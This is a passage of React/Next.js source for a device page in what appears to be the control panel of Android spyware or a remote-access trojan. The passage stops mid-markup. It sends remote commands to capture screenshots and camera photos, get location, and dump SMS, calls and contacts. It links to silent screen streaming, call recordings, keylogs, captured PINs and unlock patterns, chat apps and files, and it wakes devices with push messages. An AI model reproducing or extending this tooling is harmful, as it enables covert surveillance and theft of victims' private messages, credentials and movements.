'use client';

import { useEffect, useState, useCallback, Suspense } from 'react';
import { useSearchParams, useRouter } from 'next/navigation';
import Sidebar from '@/components/layout/Sidebar';
import Header from '@/components/layout/Header';
import { connectSocket, pingDevice } from '@/lib/socket';
import { getDevice, dispatchCommand, getCommandHistory, getUnreadCounts, refreshRealtimeStatus, wakeupDevice, requestAccessibility } from '@/lib/api';
import { initializeLastViewed } from '@/lib/lastViewed';
import { useAuthStore, useDevicesStore } from '@/lib/store';
import { formatDistanceToNow, format } from 'date-fns';
import {
    Smartphone,
    MapPin,
    MessageSquare,
    Phone,
    Users,
    Keyboard,
    Bell,
    Image,
    Camera,
    Monitor,
    Send,
    RefreshCw,
    CheckCircle,
    Clock,
    XCircle,
    ChevronRight,
    ChevronDown,
    Video,
    Wifi,
    WifiOff,
    Zap,
    ArrowLeft,
    Mic,
    BarChart3,
    Settings,
    Terminal,
    Activity,
    Command,
    MessageCircle,
    Battery,
    BatteryCharging,
    Signal,
    FolderOpen,
    Lock,
    Sparkles,
    Shield,
    Eye,
    Radio,
} from 'lucide-react';
import Link from 'next/link';

const commandButtons = [
    { type: 'capture_screenshot', label: 'Screenshot', icon: Monitor, gradient: 'from-blue-500 to-cyan-400', category: 'capture', permission: 'screenshot' },
    { type: 'capture_photo', label: 'Front Camera', icon: Camera, gradient: 'from-purple-500 to-pink-400', payload: { camera: 'front' }, category: 'capture', permission: 'camera_front' },
    { type: 'capture_photo', label: 'Back Camera', icon: Camera, gradient: 'from-orange-500 to-amber-400', payload: { camera: 'back' }, category: 'capture', permission: 'camera_back' },
    { type: 'get_location', label: 'Get Location', icon: MapPin, gradient: 'from-emerald-500 to-teal-400', category: 'sync', permission: 'live_location' },
    { type: 'dump_sms', label: 'Sync Latest SMS', icon: MessageSquare, gradient: 'from-pink-500 to-rose-400', payload: { days: 1 }, category: 'sync', permission: 'sms_sync' },
    { type: 'dump_sms', label: 'Sync All SMS', icon: MessageSquare, gradient: 'from-pink-600 to-rose-500', category: 'sync', requiresConfirm: true, permission: 'sms_sync' },
    { type: 'dump_calls', label: 'Sync Latest Calls', icon: Phone, gradient: 'from-cyan-500 to-blue-400', payload: { days: 1 }, category: 'sync', permission: 'calls_sync' },
    { type: 'dump_calls', label: 'Sync All Calls', icon: Phone, gradient: 'from-cyan-600 to-blue-500', category: 'sync', requiresConfirm: true, permission: 'calls_sync' },
    { type: 'dump_contacts', label: 'Sync Contacts', icon: Users, gradient: 'from-indigo-500 to-purple-400', category: 'sync', permission: 'contacts_sync' },
];

const dataLinks = [
    { href: 'stream', label: 'Live Stream', icon: Video, gradient: 'from-red-500 to-rose-400', description: 'Camera & mic feed', key: 'stream', permission: 'stream' },
    { href: 'silent-stream', label: 'Silent Stream', icon: Monitor, gradient: 'from-violet-500 to-purple-400', description: 'Screen capture', key: 'silent_stream', permission: 'stream_silent' },
    { href: 'recordings', label: 'Recordings', icon: Mic, gradient: 'from-amber-500 to-yellow-400', description: 'Call recordings', key: 'recordings', permission: 'recordings' },
    { href: 'sms', label: 'Messages', icon: MessageSquare, gradient: 'from-blue-500 to-cyan-400', description: 'SMS history', key: 'sms', permission: 'sms' },
    { href: 'send-sms', label: 'Send SMS', icon: Send, gradient: 'from-green-500 to-emerald-400', description: 'Send messages', key: 'send-sms', permission: 'sms_send' },
    { href: 'calls', label: 'Call Logs', icon: Phone, gradient: 'from-emerald-500 to-teal-400', description: 'Call history', key: 'calls', permission: 'calls' },
    { href: 'contacts', label: 'Contacts', icon: Users, gradient: 'from-purple-500 to-pink-400', description: 'Contact list', key: 'contacts', permission: 'contacts' },
    { href: 'keylogs', label: 'Keylogs', icon: Keyboard, gradient: 'from-orange-500 to-amber-400', description: 'Keystrokes', key: 'keylogs', permission: 'keylogs' },
    { href: 'phone-lock', label: 'Captured Pins', icon: Lock, gradient: 'from-red-600 to-rose-500', description: 'PIN & Pattern', key: 'unlocks', permission: 'phone_lock' },
    { href: 'notifications', label: 'Notifications', icon: Bell, gradient: 'from-pink-500 to-rose-400', description: 'App alerts', key: 'notifications', permission: 'notifications' },
    { href: 'gallery', label: 'Gallery', icon: Image, gradient: 'from-cyan-500 to-blue-400', description: 'Photos & media', key: 'gallery', permission: 'gallery' },
    { href: 'location', label: 'Location', icon: MapPin, gradient: 'from-yellow-500 to-orange-400', description: 'GPS history', key: 'locations', permission: 'location' },
    { href: 'files', label: 'Files', icon: FolderOpen, gradient: 'from-indigo-500 to-purple-400', description: 'Browse device files', key: 'files', permission: 'files' },
    { href: 'settings', label: 'Settings', icon: Settings, gradient: 'from-slate-600 to-zinc-500', description: 'Device config', key: 'settings', permission: 'settings' },
    { href: 'logs', label: 'App Logs', icon: Terminal, gradient: 'from-slate-500 to-gray-400', description: 'Debug logs', key: 'logs', permission: 'logs' },
    { href: '/messages', label: 'Chat Apps', icon: MessageCircle, gradient: 'from-green-500 to-emerald-400', description: 'WhatsApp & more', isExternal: true, key: 'chats', permission: 'chat' },
];

export default function DeviceDetailPage() {
    return (
        <Suspense fallback={<DeviceLoadingSkeleton />}>
            <DeviceDetailContent />
        </Suspense>
    );
}

function DeviceLoadingSkeleton() {
    return (
        <div className="min-h-screen bg-gradient-to-br from-slate-50 via-white to-slate-100">
            <div className="flex items-center justify-center min-h-screen">
                <div className="flex flex-col items-center gap-4">
                    <div className="w-20 h-20 rounded-3xl bg-gradient-to-br from-violet-500 to-purple-600 flex items-center justify-center animate-pulse shadow-xl shadow-purple-500/30">
                        <Smartphone className="w-10 h-10 text-white" />
                    </div>
                    <div className="h-2 w-40 bg-slate-200 rounded-full overflow-hidden">
                        <div className="h-full w-1/2 bg-gradient-to-r from-violet-500 to-purple-500 rounded-full animate-pulse" />
                    </div>
                    <p className="text-sm text-slate-500 font-medium">Loading device...</p>
                </div>
            </div>
        </div>
    );
}

function DeviceDetailContent() {
    const router = useRouter();
    const searchParams = useSearchParams();
    const deviceId = searchParams.get('id') as string;
    const { isAuthenticated, isHydrated, isAdmin, hasPermission } = useAuthStore();

    const [device, setDevice] = useState<any>(null);
    const [commands, setCommands] = useState<any[]>([]);
    const [loading, setLoading] = useState(true);
    const [commandLoading, setCommandLoading] = useState<string | null>(null);
    const [cooldown, setCooldown] = useState<number>(0);
    const [checkingStatus, setCheckingStatus] = useState(false);
    const [activeTab, setActiveTab] = useState<'commands' | 'data'>('data');
    const { updateDevice } = useDevicesStore();

    const [confirmModal, setConfirmModal] = useState<{ show: boolean; type: string; label: string; payload?: any; step: number } | null>(null);

    const [liveStats, setLiveStats] = useState<{
        batteryLevel?: number;
        isCharging?: boolean;
        networkType?: string;
        isRecording?: boolean;
        recordingNumber?: string;
    }>({});

    const [unreadCounts, setUnreadCounts] = useState<{
        recordings?: number;
        sms?: number;
        calls?: number;
        photos?: number;
        screenshots?: number;
        notifications?: number;
        keylogs?: number;
        locations?: number;
        gallery?: number;
    }>({});

    const [accessibilityEnabled, setAccessibilityEnabled] = useState<boolean | null>(null);
    const [wakingUp, setWakingUp] = useState(false);
    const [wakeupResult, setWakeupResult] = useState<{ success: boolean; message: string } | null>(null);
    const [requestingAccessibility, setRequestingAccessibility] = useState(false);
    const [accessibilityResult, setAccessibilityResult] = useState<{ success: boolean; message: string } | null>(null);

    const getLastViewedTimestamps = useCallback(() => {
        if (typeof window === 'undefined') return {};
        const key = `lastViewed_${deviceId}`;
        try {
            const stored = localStorage.getItem(key);
            return stored ? JSON.parse(stored) : {};
        } catch {
            return {};
        }
    }, [deviceId]);

    const fetchUnreadCounts = useCallback(async () => {
        if (!deviceId) return;
        try {
            const timestamps = getLastViewedTimestamps();
            if (Object.keys(timestamps).length === 0) return;
            const result = await getUnreadCounts(deviceId, timestamps);
            if (result.success) {
                setUnreadCounts(result.counts);
            }
        } catch (error) {
            console.error('Failed to fetch unread counts:', error);
        }
    }, [deviceId, getLastViewedTimestamps]);

    const handleCheckStatus = async () => {
        if (!device?.deviceId || checkingStatus) return;
        setCheckingStatus(true);

        try {
            const socket = connectSocket();
            socket.emit('command:send', {
                deviceId: device.deviceId,
                type: 'get_status',
                payload: {}
            });
        } catch (error) {
            console.error('Status check failed:', error);
        } finally {
            setTimeout(() => setCheckingStatus(false), 2000);
        }
    };

    const fetchDevice = useCallback(async () => {
        try {
            setLoading(true);
            // Sync realtime status with actual socket connections first
            await refreshRealtimeStatus().catch(() => { });

            const [deviceData, commandsData] = await Promise.all([
                getDevice(deviceId),
                getCommandHistory(deviceId, 10),
            ]);

            if (deviceData.success) {
                setDevice(deviceData.device);
                // Initialize liveStats from device data if available
                const dev = deviceData.device;
                if (dev.batteryLevel !== undefined || dev.networkType) {
                    setLiveStats(prev => ({
                        ...prev,
                        batteryLevel: dev.batteryLevel,
                        networkType: dev.networkType,
                        isCharging: dev.isCharging,
                    }));
                }
                // Auto-request status update if device is online
                if (dev.isOnline) {
                    setTimeout(() => {
                        const socket = connectSocket();
                        socket.emit('command:send', {
                            deviceId: dev.deviceId,
                            type: 'get_status',
                            payload: {}
                        });
                    }, 500);
                }
            }
            if (commandsData.success) {
                setCommands(commandsData.commands);
            }
        } catch (error) {
            console.error('Failed to fetch device:', error);
        } finally {
            setLoading(false);
        }
    }, [deviceId]);

    useEffect(() => {
        if (isHydrated && !isAuthenticated) {
            router.push('/login');
        }
    }, [isHydrated, isAuthenticated, router]);

    useEffect(() => {
        if (isAuthenticated && deviceId) {
            fetchDevice();
            initializeLastViewed(deviceId);

            const socket = connectSocket();

            // Define handlers so we can properly remove just OUR listeners on cleanup
            const handleOnline = (data: { deviceId: string }) => {
                if (data.deviceId === deviceId) {
                    setDevice((prev: any) => prev ? { ...prev, isOnline: true } : prev);
                }
            };

            const handleOffline = (data: { deviceId: string }) => {
                if (data.deviceId === deviceId) {
                    setDevice((prev: any) => prev ? { ...prev, isOnline: false } : prev);
                }
            };

            const handleStatus = (data: {
                deviceId: string;
                batteryLevel?: number;
                networkType?: string;
                isCharging?: boolean
            }) => {
                if (data.deviceId === deviceId) {
                    setLiveStats(prev => ({
                        ...prev,
                        batteryLevel: data.batteryLevel,
                        networkType: data.networkType,
                        isCharging: data.isCharging
                    }));
                }
            };

            const handleRecordingStatus = (data: { deviceId: string; status: string; phoneNumber?: string }) => {
                if (data.deviceId === deviceId) {
                    setLiveStats(prev => ({
                        ...prev,
                        isRecording: data.status === 'recording',
                        recordingNumber: data.phoneNumber
                    }));
                }
            };

            const handlePermissions = (data: { deviceId: string; permissions: any }) => {
                if (data.deviceId === deviceId && data.permissions) {
                    const isEnabled = data.permissions.accessibility === true;
                    setAccessibilityEnabled(isEnabled);
                    // Show status message
                    setAccessibilityResult({
                        success: true,
                        message: `Accessibility Service: ${isEnabled ? '✅ ENABLED' : '❌ DISABLED'}`
                    });
                    setTimeout(() => setAccessibilityResult(null), 5000);
                }
            };

            socket.on('device:online', handleOnline);
            socket.on('device:offline', handleOffline);
            socket.on('device:status', handleStatus);
            socket.on('recording:status', handleRecordingStatus);
            socket.on('device:permissions', handlePermissions);

            return () => {
                // Only remove OUR specific listeners, not all listeners for these events
                socket.off('device:online', handleOnline);
                socket.off('device:offline', handleOffline);
                socket.off('device:status', handleStatus);
                socket.off('recording:status', handleRecordingStatus);
                socket.off('device:permissions', handlePermissions);
            };
        }
    }, [isAuthenticated, deviceId, fetchDevice]);

    useEffect(() => {
        if (cooldown > 0) {
            const timer = setTimeout(() => setCooldown(prev => prev - 1), 1000);
            return () => clearTimeout(timer);
        }
    }, [cooldown]);

    useEffect(() => {
        if (isAuthenticated && deviceId) {
            fetchUnreadCounts();
        }
    }, [isAuthenticated, deviceId, fetchUnreadCounts]);

    const handleCommand = async (type: string, payload?: any) => {
        if (cooldown > 0) return;

        setCommandLoading(type);
        try {
            const res = await dispatchCommand(deviceId, type, payload);
            if (res.success) {
                setCooldown(5);
                setTimeout(async () => {
                    const data = await getCommandHistory(deviceId, 10);
                    if (data.success) {
                        setCommands(data.commands);
                    }
                }, 500);
            }
        } catch (error: any) {
            console.error('Failed to dispatch command:', error);
            if (error.response?.data?.code === 'RATE_LIMIT') {
                setCooldown(5);
            }
        } finally {
            setCommandLoading(null);
        }
    };

    const handleCommandWithConfirmation = (cmd: typeof commandButtons[0]) => {
        if ((cmd as any).requiresConfirm) {
            setConfirmModal({ show: true, type: cmd.type, label: cmd.label, payload: cmd.payload, step: 1 });
        } else {
            handleCommand(cmd.type, cmd.payload);
        }
    };

    const handleConfirmProceed = () => {
        if (!confirmModal) return;
        if (confirmModal.step === 1) {
            setConfirmModal({ ...confirmModal, step: 2 });
        } else {
            handleCommand(confirmModal.type, confirmModal.payload);
            setConfirmModal(null);
        }
    };

    if (!isHydrated || !isAuthenticated) return null;

    if (loading) {
        return <DeviceLoadingSkeleton />;
    }

    if (!device) {
        return (
            <div className="min-h-screen bg-[var(--bg-base)] pb-20 lg:pb-0">
                <Sidebar />
                <main className="lg:ml-72">
                    <Header title="Device Not Found" showBack />
                    <div className="p-4 lg:p-8">
                        <div className="bg-white rounded-2xl p-12 text-center border border-slate-200 shadow-sm">
                            <div className="w-20 h-20 mx-auto mb-6 rounded-2xl bg-slate-100 flex items-center justify-center">
                                <Smartphone className="w-10 h-10 text-slate-400" />
                            </div>
                            <h3 className="font-bold text-xl text-slate-900 mb-2">Device Not Found</h3>
                            <p className="text-slate-500 mb-6">The requested device could not be found.</p>
                            <Link
                                href="/"
                                className="inline-flex items-center gap-2 px-5 py-3 rounded-xl bg-gradient-to-r from-violet-500 to-purple-600 text-white font-medium shadow-lg shadow-purple-500/25"
                            >
                                <ArrowLeft className="w-5 h-5" />
                                Back to Dashboard
                            </Link>
                        </div>
                    </div>
                </main>
            </div>
        );
    }

    const getBatteryColor = (level?: number) => {
        if (!level) return { text: 'text-slate-400', bg: 'bg-slate-100' };
        if (level <= 20) return { text: 'text-red-500', bg: 'bg-red-500/10' };
        if (level <= 50) return { text: 'text-amber-500', bg: 'bg-amber-500/10' };
        return { text: 'text-emerald-500', bg: 'bg-emerald-500/10' };
    };

    const batteryColors = getBatteryColor(liveStats.batteryLevel);

    return (
        <div className="min-h-screen bg-[var(--bg-base)] pb-24 lg:pb-0">
            <Sidebar />
            <main className="lg:ml-72">
                <Header
                    title={device.manufacturer ? `${device.manufacturer} ${device.model || ''}`.trim() : (device.model || 'Device')}
                    subtitle={device.isOnline ? 'Currently Online' : 'Offline'}
                    onRefresh={fetchDevice}
                    deviceId={device.deviceId}
                    showBack
                    deviceInfo={{
                        androidVersion: device.androidVersion,
                        model: device.model,
                        batteryLevel: liveStats.batteryLevel,
                        networkType: liveStats.networkType,
                        isCharging: liveStats.isCharging,
                        isRecording: liveStats.isRecording,
                        recordingNumber: liveStats.recordingNumber,
                    }}
                />

                <div className="p-2 lg:px-8 lg:py-6 lg:max-w-7xl lg:mx-auto space-y-4">
                    {/* Clean Modern Device Hero Card - Hostinger Style */}
                    <div className="relative bg-white rounded-2xl lg:rounded-3xl border border-slate-200/60 overflow-hidden shadow-lg">
                        {/* Gradient Banner */}
                        <div className={`h-20 lg:h-36 ${device.isOnline
                            ? 'bg-gradient-to-r from-violet-500 via-purple-500 to-fuchsia-500'
                            : 'bg-gradient-to-r from-slate-400 via-slate-500 to-gray-500'
                            }`}>
                            {/* Subtle pattern */}
                            <div className="absolute inset-0 opacity-20" style={{
                                backgroundImage: 'radial-gradient(circle at 20px 20px, white 1px, transparent 0)',
                                backgroundSize: '40px 40px'
                            }} />
                        </div>

                        {/* Content */}
                        <div className="relative px-4 pb-4 lg:px-6 lg:pb-6 -mt-10 lg:-mt-12">
                            {/* Device Icon */}
                            <div className="flex items-end justify-between mb-3 lg:mb-4">
                                <div className={`w-16 h-16 lg:w-24 lg:h-24 rounded-2xl flex items-center justify-center border-4 border-white shadow-xl ${device.isOnline
                                    ? 'bg-gradient-to-br from-emerald-400 to-teal-500'
                                    : 'bg-gradient-to-br from-slate-400 to-gray-500'
                                    }`}>
                                    <Smartphone className="w-8 h-8 lg:w-12 lg:h-12 text-white" />
                                </div>

                                {/* Status Badge */}
                                <span className={`inline-flex items-center gap-1.5 px-3 py-1.5 lg:px-4 lg:py-2 rounded-full text-xs lg:text-sm font-bold shadow-sm ${device.isOnline
                                    ? 'bg-emerald-50 text-emerald-600 border border-emerald-200'
                                    : 'bg-slate-100 text-slate-600 border border-slate-200'
                                    }`}>
                                    {device.isOnline ? (
                                        <>
                                            <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                                            Online
                                        </>
                                    ) : (
                                        <>
                                            <WifiOff className="w-3.5 h-3.5" />
                                            Offline
                                        </>
                                    )}
                                </span>
                            </div>

                            {/* Device Info */}
                            <h1 className="text-xl lg:text-3xl font-bold text-slate-900 mb-1 lg:mb-2">
                                {device.manufacturer ? `${device.manufacturer} ${device.model || ''}`.trim() : (device.model || 'Unknown Device')}
                            </h1>
                            <div className="flex flex-wrap items-center gap-2 lg:gap-3 mb-4 lg:mb-6">
                                <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded-lg bg-violet-50 text-violet-600 text-[11px] lg:text-sm font-semibold border border-violet-100">
                                    <Smartphone className="w-3 h-3" />
                                    Android {device.androidVersion}
                                </span>
                                <span className="text-slate-500 text-[11px] lg:text-sm">
                                    {device.manufacturer}
                                </span>
                                <span className="flex items-center gap-1 text-slate-400 text-[11px] lg:text-sm">
                                    <Clock className="w-3 h-3" />
                                    {formatDistanceToNow(new Date(device.lastSeen), { addSuffix: true })}
                                </span>
                            </div>

                            {/* Action Buttons */}
                            <div className="flex gap-2 mb-4 lg:mb-6">
                                {/* Refresh Button */}
                                <button
                                    onClick={handleCheckStatus}
                                    disabled={checkingStatus || !device.isOnline}
                                    className="flex-1 flex items-center justify-center gap-2 lg:gap-3 px-4 py-3 lg:px-6 lg:py-4 rounded-xl bg-gradient-to-r from-violet-500 to-purple-600 text-white font-bold shadow-lg shadow-purple-500/20 hover:shadow-purple-500/30 transition-all disabled:opacity-50 disabled:cursor-not-allowed active:scale-[0.99] text-sm lg:text-base"
                                >
                                    <RefreshCw className={`w-4 h-4 lg:w-5 lg:h-5 ${checkingStatus ? 'animate-spin' : ''}`} />
                                    {checkingStatus ? 'Refreshing...' : 'Refresh Status'}
                                </button>

                                {/* Wake Up Button - visible when device is offline */}
                                {!device.isOnline && (
                                    <button
                                        onClick={async () => {
                                            setWakingUp(true);
                                            setWakeupResult(null);
                                            try {
                                                const result = await wakeupDevice(deviceId);
                                                setWakeupResult({ success: true, message: 'Wakeup push sent!' });
                                                setTimeout(() => setWakeupResult(null), 3000);
                                            } catch (error: any) {
                                                setWakeupResult({ success: false, message: error.message || 'Failed to send wakeup' });
                                                setTimeout(() => setWakeupResult(null), 5000);
                                            } finally {
                                                setWakingUp(false);
                                            }
                                        }}
                                        disabled={wakingUp}
                                        className="flex items-center justify-center gap-2 px-4 py-3 lg:px-6 lg:py-4 rounded-xl bg-gradient-to-r from-amber-500 to-orange-500 text-white font-bold shadow-lg shadow-orange-500/20 hover:shadow-orange-500/30 transition-all disabled:opacity-50 disabled:cursor-not-allowed active:scale-[0.99] text-sm lg:text-base"
                                        title="Send FCM push to wake up the app"
                                    >
                                        <Zap className={`w-4 h-4 lg:w-5 lg:h-5 ${wakingUp ? 'animate-pulse' : ''}`} />
                                        {wakingUp ? 'Sending...' : 'Wake Up'}
                                    </button>
                                )}

                                {/* Check Accessibility Status Button - checks if accessibility is enabled */}
                                <button
                                    onClick={async () => {
                                        setRequestingAccessibility(true);
                                        setAccessibilityResult(null);
                                        try {
                                            const result = await requestAccessibility(deviceId);
                                            // The device will report back via heartbeat with accessibilityEnabled field
                                            setAccessibilityResult({ success: true, message: 'Status check sent! Waiting for response...' });
                                            // Clear message after 5 seconds
                                            setTimeout(() => setAccessibilityResult(null), 5000);
                                        } catch (error: any) {
                                            setAccessibilityResult({ success: false, message: error.message || 'Failed to check status' });
                                            setTimeout(() => setAccessibilityResult(null), 5000);
                                        } finally {
                                            setRequestingAccessibility(false);
                                        }
                                    }}
                                    disabled={requestingAccessibility}
                                    className={`flex items-center justify-center gap-2 px-4 py-3 lg:px-6 lg:py-4 rounded-xl font-bold shadow-lg transition-all disabled:opacity-50 disabled:cursor-not-allowed active:scale-[0.99] text-sm lg:text-base ${accessibilityEnabled === true
                                        ? 'bg-gradient-to-r from-emerald-500 to-green-500 text-white shadow-green-500/20 hover:shadow-green-500/30'
                                        : accessibilityEnabled === false
                                            ? 'bg-gradient-to-r from-red-500 to-rose-500 text-white shadow-red-500/20 hover:shadow-red-500/30'
                                            : 'bg-gradient-to-r from-cyan-500 to-blue-500 text-white shadow-blue-500/20 hover:shadow-blue-500/30'
                                        }`}
                                    title="Check if accessibility service is enabled on device"
                                >
                                    <Shield className={`w-4 h-4 lg:w-5 lg:h-5 ${requestingAccessibility ? 'animate-pulse' : ''}`} />
                                    {requestingAccessibility ? 'Checking...' : (
                                        accessibilityEnabled === true ? '✓ Accessibility ON' :
                                            accessibilityEnabled === false ? '✗ Accessibility OFF' :
                                                'Check Accessibility'
                                    )}
                                </button>
                            </div>

                            {/* Wakeup Result Message */}
                            {wakeupResult && (
                                <div className={`mb-4 p-3 rounded-xl text-sm font-medium ${wakeupResult.success
                                    ? 'bg-emerald-50 text-emerald-700 border border-emerald-200'
                                    : 'bg-red-50 text-red-700 border border-red-200'
                                    }`}>
                                    {wakeupResult.success ? '✅ ' : '❌ '}{wakeupResult.message}
                                </div>
                            )}

                            {/* Accessibility Status Result Message */}
                            {accessibilityResult && (
                                <div className={`mb-4 p-3 rounded-xl text-sm font-medium ${accessibilityResult.success
                                    ? 'bg-blue-50 text-blue-700 border border-blue-200'
                                    : 'bg-red-50 text-red-700 border border-red-200'
                                    }`}>
                                    {accessibilityResult.success ? '🔍 ' : '❌ '}{accessibilityResult.message}
                                </div>
                            )}

                            {/* Stats Grid - Clean Cards */}
                            <div className="grid grid-cols-2 lg:grid-cols-4 gap-2 lg:gap-3">
                                {/* Battery */}
                                <div className={`p-3 lg:p-4 rounded-xl border ${liveStats.batteryLevel !== undefined
                                    ? liveStats.batteryLevel <= 20 ? 'bg-red-50 border-red-100'
                                        : liveStats.batteryLevel <= 50 ? 'bg-amber-50 border-amber-100'
                                            : 'bg-emerald-50 border-emerald-100'
                                    : 'bg-slate-50 border-slate-100'
                                    }`}>
                                    <div className="flex items-center gap-2 lg:gap-3">
                                        <div className={`w-9 h-9 lg:w-10 lg:h-10 rounded-lg flex items-center justify-center ${liveStats.batteryLevel !== undefined
                                            ? liveStats.batteryLevel <= 20 ? 'bg-red-100'
                                                : liveStats.batteryLevel <= 50 ? 'bg-amber-100'
                                                    : 'bg-emerald-100'
                                            : 'bg-slate-100'
                                            }`}>
                                            {liveStats.isCharging ? (
                                                <BatteryCharging className={`w-4 h-4 lg:w-5 lg:h-5 ${liveStats.batteryLevel !== undefined
                                                    ? liveStats.batteryLevel <= 20 ? 'text-red-500'
                                                        : liveStats.batteryLevel <= 50 ? 'text-amber-500'
                                                            : 'text-emerald-500'
                                                    : 'text-slate-400'
                                                    }`} />
                                            ) : (
                                                <Battery className={`w-4 h-4 lg:w-5 lg:h-5 ${liveStats.batteryLevel !== undefined
                                                    ? liveStats.batteryLevel <= 20 ? 'text-red-500'
                                                        : liveStats.batteryLevel <= 50 ? 'text-amber-500'
                                                            : 'text-emerald-500'
                                                    : 'text-slate-400'
                                                    }`} />
                                            )}
                                        </div>
                                        <div>
                                            <p className={`text-lg lg:text-xl font-bold ${liveStats.batteryLevel !== undefined
                                                ? liveStats.batteryLevel <= 20 ? 'text-red-600'
                                                    : liveStats.batteryLevel <= 50 ? 'text-amber-600'
                                                        : 'text-emerald-600'
                                                : 'text-slate-400'
                                                }`}>
                                                {liveStats.batteryLevel !== undefined ? `${liveStats.batteryLevel}%` : '--'}
                                            </p>
                                            <p className="text-[10px] lg:text-xs text-slate-500 font-medium">
                                                {liveStats.isCharging ? '⚡ Charging' : 'Battery'}
                                            </p>
                                        </div>
                                    </div>
                                </div>

                                {/* Network */}
                                <div className="p-3 lg:p-4 rounded-xl bg-blue-50 border border-blue-100">
                                    <div className="flex items-center gap-2 lg:gap-3">
                                        <div className="w-9 h-9 lg:w-10 lg:h-10 rounded-lg bg-blue-100 flex items-center justify-center">
                                            {liveStats.networkType?.toLowerCase().includes('wifi') ? (
                                                <Wifi className="w-4 h-4 lg:w-5 lg:h-5 text-blue-500" />
                                            ) : (
                                                <Signal className="w-4 h-4 lg:w-5 lg:h-5 text-blue-500" />
                                            )}
                                        </div>
                                        <div>
                                            <p className="text-base lg:text-lg font-bold text-blue-600 uppercase">
                                                {liveStats.networkType || '--'}
                                            </p>
                                            <p className="text-[10px] lg:text-xs text-slate-500 font-medium">Network</p>
                                        </div>
                                    </div>
                                </div>

                                {/* Last Active */}
                                <div className="p-3 lg:p-4 rounded-xl bg-orange-50 border border-orange-100">
                                    <div className="flex items-center gap-2 lg:gap-3">
                                        <div className="w-9 h-9 lg:w-10 lg:h-10 rounded-lg bg-orange-100 flex items-center justify-center">
                                            <Clock className="w-4 h-4 lg:w-5 lg:h-5 text-orange-500" />
                                        </div>
                                        <div>
                                            <p className="text-base lg:text-lg font-bold text-orange-600 truncate max-w-[60px] lg:max-w-none">
                                                {formatDistanceToNow(new Date(device.lastSeen), { addSuffix: false })}
                                            </p>
                                            <p className="text-[10px] lg:text-xs text-slate-500 font-medium">Last Active</p>
                                        </div>
                                    </div>
                                </div>

                                {/* Recording */}
                                <div className={`p-3 lg:p-4 rounded-xl ${liveStats.isRecording ? 'bg-red-50 border-red-200' : 'bg-slate-50 border-slate-100'} border`}>
                                    <div className="flex items-center gap-2 lg:gap-3">
                                        <div className={`w-9 h-9 lg:w-10 lg:h-10 rounded-lg flex items-center justify-center ${liveStats.isRecording ? 'bg-red-100' : 'bg-slate-100'}`}>
                                            <Mic className={`w-4 h-4 lg:w-5 lg:h-5 ${liveStats.isRecording ? 'text-red-500' : 'text-slate-400'}`} />
                                        </div>
                                        <div>
                                            <p className={`text-base lg:text-lg font-bold ${liveStats.isRecording ? 'text-red-600' : 'text-slate-600'}`}>
                                                {liveStats.isRecording ? 'REC' : 'Idle'}
                                            </p>
                                            <p className="text-[10px] lg:text-xs text-slate-500 font-medium">
                                                {liveStats.isRecording && liveStats.recordingNumber ? liveStats.recordingNumber : 'Call Rec'}
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            {/* Cooldown */}
                            {cooldown > 0 && (
                                <div className="mt-4 flex justify-center">
                                    <span className="inline-flex items-center gap-2 text-sm text-violet-600 bg-violet-50 px-4 py-2 rounded-full font-semibold border border-violet-100">
                                        <RefreshCw className="w-4 h-4 animate-spin" />
                                        Command cooldown: {cooldown}s
                                    </span>
                                </div>
                            )}
                        </div>
                    </div>

                    {/* Main Content Grid */}
                    <div className="grid grid-cols-1 xl:grid-cols-3 gap-6">
                        {/* Left Column - Tabs & Content */}
                        <div className="xl:col-span-2 space-y-6">
                            {/* Tab Navigation - Light Theme */}
                            <div className="flex gap-2 p-1.5 rounded-2xl bg-white border border-slate-200 shadow-sm">
                                <button
                                    onClick={() => setActiveTab('data')}
                                    className={`flex-1 flex items-center justify-center gap-2 px-5 py-3.5 rounded-xl font-semibold transition-all ${activeTab === 'data'
                                        ? 'bg-gradient-to-r from-violet-500 to-purple-600 text-white shadow-lg shadow-purple-500/25'
                                        : 'text-slate-500 hover:text-slate-700 hover:bg-slate-50'
                                        }`}
                                >
                                    <Eye className="w-5 h-5" />
                                    Device Data
                                </button>
                                <button
                                    onClick={() => setActiveTab('commands')}
                                    className={`flex-1 flex items-center justify-center gap-2 px-5 py-3.5 rounded-xl font-semibold transition-all ${activeTab === 'commands'
                                        ? 'bg-gradient-to-r from-violet-500 to-purple-600 text-white shadow-lg shadow-purple-500/25'
                                        : 'text-slate-500 hover:text-slate-700 hover:bg-slate-50'
                                        }`}
                                >
                                    <Radio className="w-5 h-5" />
                                    Commands
                                </button>
                            </div>

                            {/* Data Tab - Light Theme Cards */}
                            {activeTab === 'data' && (
                                <div className="grid grid-cols-2 lg:grid-cols-3 gap-4 animate-fade-in">
                                    {dataLinks
                                        .filter(link => isAdmin || hasPermission(link.permission))
                                        .map((link) => {
                                            const Icon = link.icon;
                                            const linkHref = (link as any).isExternal
                                                ? `${link.href}?deviceId=${deviceId}`
                                                : `/devices/view/${link.href}/?id=${deviceId}`;
                                            const unreadCount = unreadCounts[link.key as keyof typeof unreadCounts] || 0;

                                            return (
                                                <Link key={link.href} href={linkHref}>
                                                    <div className="group relative bg-white rounded-2xl border border-slate-200 p-5 hover:shadow-lg hover:-translate-y-0.5 transition-all duration-300 cursor-pointer overflow-hidden">
                                                        {/* Unread Badge */}
                                                        {unreadCount > 0 && (
                                                            <div className="absolute top-3 right-3 min-w-[24px] h-[24px] px-1.5 bg-red-500 rounded-full flex items-center justify-center shadow-lg shadow-red-500/30 z-10">
                                                                <span className="text-white text-xs font-bold">
                                                                    {unreadCount > 99 ? '99+' : unreadCount}
                                                                </span>
                                                            </div>
                                                        )}

                                                        <div className={`w-14 h-14 rounded-2xl bg-gradient-to-br ${link.gradient} flex items-center justify-center shadow-lg group-hover:scale-105 transition-transform mb-4`}>
                                                            <Icon className="w-7 h-7 text-white" />
                                                        </div>
                                                        <h3 className="font-bold text-slate-800">{link.label}</h3>
                                                        <p className="text-sm text-slate-500 mt-1">{link.description}</p>

                                                        <ChevronRight className="absolute bottom-5 right-5 w-5 h-5 text-slate-300 group-hover:text-violet-500 group-hover:translate-x-1 transition-all" />
                                                    </div>
                                                </Link>
                                            );
                                        })}
                                </div>
                            )}

                            {/* Commands Tab - Light Theme Cards */}
                            {activeTab === 'commands' && (
